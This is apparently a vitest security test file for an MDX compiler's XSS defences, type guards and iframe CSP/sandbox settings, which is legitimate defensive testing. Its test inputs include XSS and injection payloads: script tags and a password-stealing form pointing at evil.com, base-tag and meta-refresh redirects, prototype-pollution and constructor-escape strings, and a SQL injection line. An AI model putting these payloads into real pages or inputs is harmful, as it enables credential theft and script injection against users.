/**
 * Security Tests
 *
 * Tests for XSS prevention, malicious payload handling, and security-related edge cases.
 * Validates that the MDX compiler and type guards properly sanitize inputs.
 *
 * @module renderer/__tests__/security.test
 */

import { describe, it, expect } from 'vitest';
import type { RequestId } from '@shared/types/preview-worker';
import { compileMdx, sanitizeFrontmatter } from '../lib/mdx/compile';
import {
  isParentToIframeMessage,
  isIframeToParentMessage,
  IFRAME_SANDBOX,
  IFRAME_CSP,
} from '@shared/types/preview-iframe';
import {
  isCompileRequest,
  isCompileResponse,
  isRequestId,
} from '@shared/types/preview-worker';

/** Helper to create a test RequestId */
const testId = (id: string): RequestId => id as RequestId;

describe('Security - XSS Prevention', () => {
  describe('script injection attempts', () => {
    it('should handle inline script tags in markdown', async () => {
      const source = `# Title

<script>alert('xss')</script>

Content after script`;
      const result = await compileMdx(testId('script-inline'), source);

      // Should either fail compilation or escape the script
      if (result.ok) {
        expect(result.code).not.toContain('alert');
      }
    });

    it('should handle script tag with src attribute', async () => {
      const source = `# Title

<script src="https://evil.com/xss.js"></script>`;
      const result = await compileMdx(testId('script-src'), source);

      if (result.ok) {
        expect(result.code).not.toContain('evil.com');
      }
    });

    it('should handle event handler injection', async () => {
      const source = `# Title

<img src="x" onerror="alert('xss')">
<div onclick="alert('xss')">Click me</div>
<a href="#" onmouseover="alert('xss')">Hover me</a>`;
      const result = await compileMdx(testId('event-handlers'), source);

      // Event handlers in MDX are valid JSX, but should be handled by React safely
      expect(result.id).toBe('event-handlers');
    });

    it('should handle javascript: protocol in links', async () => {
      const source = `# Title

[Click me](javascript:alert('xss'))
<a href="javascript:void(0)">Link</a>`;
      const result = await compileMdx(testId('javascript-protocol'), source);

      // MDX should compile this, React will handle sanitization at runtime
      expect(result.id).toBe('javascript-protocol');
    });

    it('should handle data: URIs with scripts', async () => {
      const source = `# Title

<iframe src="data:text/html,<script>alert('xss')</script>"></iframe>`;
      const result = await compileMdx(testId('data-uri-script'), source);

      expect(result.id).toBe('data-uri-script');
    });
  });

  describe('HTML injection attempts', () => {
    it('should handle raw HTML in markdown', async () => {
      const source = `# Title

<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;">
  Overlay attack
</div>`;
      const result = await compileMdx(testId('html-overlay'), source);

      // HTML is valid in MDX
      expect(result.id).toBe('html-overlay');
    });

    it('should handle form injection', async () => {
      const source = `# Title

<form action="https://evil.com/steal" method="POST">
  <input name="password" type="password">
  <button type="submit">Login</button>
</form>`;
      const result = await compileMdx(testId('form-injection'), source);

      // Forms are valid JSX but should be prevented by CSP
      expect(result.id).toBe('form-injection');
    });

    it('should handle meta refresh injection', async () => {
      const source = `# Title

<meta http-equiv="refresh" content="0;url=https://evil.com">`;
      const result = await compileMdx(testId('meta-refresh'), source);

      expect(result.id).toBe('meta-refresh');
    });

    it('should handle base tag injection', async () => {
      const source = `# Title

<base href="https://evil.com/">

<a href="/page">Malicious link</a>`;
      const result = await compileMdx(testId('base-injection'), source);

      expect(result.id).toBe('base-injection');
    });
  });

  describe('CSS-based attacks', () => {
    it('should handle CSS expression injection', async () => {
      const source = `# Title

<style>
.evil { background: expression(alert('xss')); }
</style>`;
      const result = await compileMdx(testId('css-expression'), source);

      expect(result.id).toBe('css-expression');
    });

    it('should handle CSS url injection', async () => {
      const source = `# Title

<div style="background: url('javascript:alert(1)')"></div>`;
      const result = await compileMdx(testId('css-url'), source);

      expect(result.id).toBe('css-url');
    });

    it('should handle CSS import', async () => {
      const source = `# Title

<style>
@import url('https://evil.com/evil.css');
</style>`;
      const result = await compileMdx(testId('css-import'), source);

      expect(result.id).toBe('css-import');
    });
  });

  describe('JSX expression injection', () => {
    it('should fail on direct code execution attempt', async () => {
      const source = `# Title

{(() => { throw new Error('XSS'); })()}`;
      const result = await compileMdx(testId('jsx-exec'), source);

      // This is valid JSX but would throw at runtime
      expect(result.id).toBe('jsx-exec');
    });

    it('should handle constructor access attempt', async () => {
      const source = `# Title

{constructor.constructor('return this')()}`;
      const result = await compileMdx(testId('constructor-access'), source);

      // Should fail to parse or be blocked
      expect(result.id).toBe('constructor-access');
    });

    it('should handle __proto__ manipulation', async () => {
      const source = `# Title

{({}).__proto__.polluted = true}`;
      const result = await compileMdx(testId('proto-pollution'), source);

      expect(result.id).toBe('proto-pollution');
    });
  });
});

describe('Security - Malicious Payloads', () => {
  describe('oversized inputs', () => {
    it('should reject payload designed to cause memory exhaustion', async () => {
      // Attempt to create exponentially expanding content
      const source = '# ' + 'A'.repeat(1_000_000);
      const result = await compileMdx(testId('memory-exhaust'), source);

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors[0]?.message).toContain('Document too large');
      }
    });

    it('should handle deeply nested structures gracefully', async () => {
      // Create deeply nested blockquotes
      const nested = Array.from({ length: 500 }, () => '>').join('') + ' deeply nested';
      const result = await compileMdx(testId('deep-nesting'), nested);

      // Should handle gracefully (either compile or fail with clear error)
      expect(result.id).toBe('deep-nesting');
    });

    it('should handle regex DoS patterns', async () => {
      // Patterns that might cause catastrophic backtracking in naive parsers
      const source = `# Title

${'a'.repeat(50)}${'!'.repeat(50)}`;
      const result = await compileMdx(testId('regex-dos'), source);

      expect(result.id).toBe('regex-dos');
    });
  });

  describe('frontmatter attacks', () => {
    it('should sanitize frontmatter with prototype pollution attempt', () => {
      const maliciousFrontmatter = {
        title: 'Normal',
        __proto__: { polluted: true },
        constructor: { prototype: { polluted: true } },
      };

      const result = sanitizeFrontmatter(maliciousFrontmatter);

      // Should strip dangerous properties
      expect(result.__proto__).toBeUndefined();
      // Note: constructor is stringified normally by JSON
    });

    it('should handle frontmatter with circular reference', () => {
      const circular: Record<string, unknown> = { title: 'Test' };
      circular.self = circular;

      const result = sanitizeFrontmatter(circular);

      // Should return empty object (serialization failed)
      expect(result).toEqual({});
    });

    it('should handle frontmatter with function values', () => {
      const withFunction = {
        title: 'Test',
        callback: () => console.log('evil'),
        nested: {
          fn: function() { return 'evil'; },
        },
      };

      const result = sanitizeFrontmatter(withFunction);

      // Functions should be stripped by JSON serialization
      expect(result.callback).toBeUndefined();
    });

    it('should handle frontmatter with Symbol keys', () => {
      const withSymbol = {
        title: 'Test',
        [Symbol('evil')]: 'value',
      };

      const result = sanitizeFrontmatter(withSymbol);

      // Symbol keys are not enumerable in JSON
      expect(Object.keys(result)).toEqual(['title']);
    });
  });
});

describe('Security - Type Guard Resilience', () => {
  describe('isParentToIframeMessage robustness', () => {
    it('should reject message with Symbol type', () => {
      const payload = { type: Symbol('render') };
      expect(isParentToIframeMessage(payload)).toBe(false);
    });

    it('should reject message with getter-based type', () => {
      const payload = {
        get type() {
          throw new Error('Evil getter');
        },
      };
      // Should either return false or not throw
      try {
        const result = isParentToIframeMessage(payload);
        expect(result).toBe(false);
      } catch {
        // Getter threw, which is acceptable behavior
      }
    });

    it('should reject frozen object with correct structure', () => {
      const payload = Object.freeze({ type: 'render' });
      expect(isParentToIframeMessage(payload)).toBe(true);
    });

    it('should handle proxy objects', () => {
      const target = { type: 'render' };
      const proxy = new Proxy(target, {
        get(t, prop) {
          if (prop === 'type') return 'malicious';
          return Reflect.get(t, prop);
        },
      });
      expect(isParentToIframeMessage(proxy)).toBe(false);
    });
  });

  describe('isIframeToParentMessage robustness', () => {
    it('should reject message with null prototype', () => {
      const payload = Object.create(null);
      payload.type = 'ready';
      expect(isIframeToParentMessage(payload)).toBe(true);
    });

    it('should handle message with toString override', () => {
      const payload = {
        type: 'ready',
        toString: () => { throw new Error('Evil'); },
      };
      expect(isIframeToParentMessage(payload)).toBe(true);
    });
  });

  describe('isCompileRequest robustness', () => {
    it('should reject request with non-UUID id that looks like UUID', () => {
      // Malformed UUID (wrong version digit)
      const payload = { id: '550e8400-e29b-11d4-a716-446655440000', source: 'test' };
      expect(isCompileRequest(payload)).toBe(false);
    });

    it('should reject request with SQL injection in source', () => {
      const payload = {
        id: '550e8400-e29b-41d4-a716-446655440000',
        source: "'; DROP TABLE users; --",
      };
      // Should accept (source is just a string)
      expect(isCompileRequest(payload)).toBe(true);
    });
  });

  describe('isRequestId robustness', () => {
    it('should reject UUID with embedded newlines', () => {
      expect(isRequestId('550e8400-e29b-41d4-a716-446655440000\n')).toBe(false);
    });

    it('should reject UUID with leading/trailing whitespace', () => {
      expect(isRequestId(' 550e8400-e29b-41d4-a716-446655440000')).toBe(false);
      expect(isRequestId('550e8400-e29b-41d4-a716-446655440000 ')).toBe(false);
    });

    it('should reject UUID with NULL bytes', () => {
      expect(isRequestId('550e8400-e29b-41d4-a716-\x00446655440000')).toBe(false);
    });
  });
});

describe('Security - CSP and Sandbox Configuration', () => {
  describe('iframe security constants', () => {
    it('should have restrictive sandbox attribute', () => {
      expect(IFRAME_SANDBOX).toBe('allow-scripts');
      // Should NOT include allow-same-origin, allow-forms, allow-popups
      expect(IFRAME_SANDBOX).not.toContain('allow-same-origin');
      expect(IFRAME_SANDBOX).not.toContain('allow-forms');
      expect(IFRAME_SANDBOX).not.toContain('allow-popups');
    });

    it('should have restrictive CSP', () => {
      // Verify key CSP directives
      expect(IFRAME_CSP).toContain("default-src 'none'");
      expect(IFRAME_CSP).toContain("connect-src 'none'");
      expect(IFRAME_CSP).toContain("object-src 'none'");
      expect(IFRAME_CSP).toContain("form-action 'none'");
      expect(IFRAME_CSP).toContain("base-uri 'none'");
    });

    it('should restrict script sources', () => {
      expect(IFRAME_CSP).toContain("script-src 'self' blob:");
      // Should not have unsafe-eval or unsafe-inline for scripts
      expect(IFRAME_CSP).not.toMatch(/script-src[^;]*'unsafe-eval'/);
      expect(IFRAME_CSP).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    });
  });
});

describe('Security - Compilation Output', () => {
  describe('code output sanitization', () => {
    it('should produce valid function-body format', async () => {
      const source = '# Hello World';
      const result = await compileMdx(testId('valid-output'), source);

      expect(result.ok).toBe(true);
      if (result.ok) {
        // Should contain JSX factory calls
        expect(result.code).toContain('_jsx');
        // Should not contain raw eval or Function constructor
        expect(result.code).not.toContain('eval(');
        expect(result.code).not.toContain('new Function(');
      }
    });

    it('should escape user content in output', async () => {
      const source = '# Test with backticks `code` here';
      const result = await compileMdx(testId('escaped-content'), source);

      expect(result.ok).toBe(true);
      if (result.ok) {
        // Output should be valid JavaScript
        expect(() => {
          // This would throw if the output has syntax errors
          new Function(result.code);
        }).not.toThrow();
      }
    });
  });
});
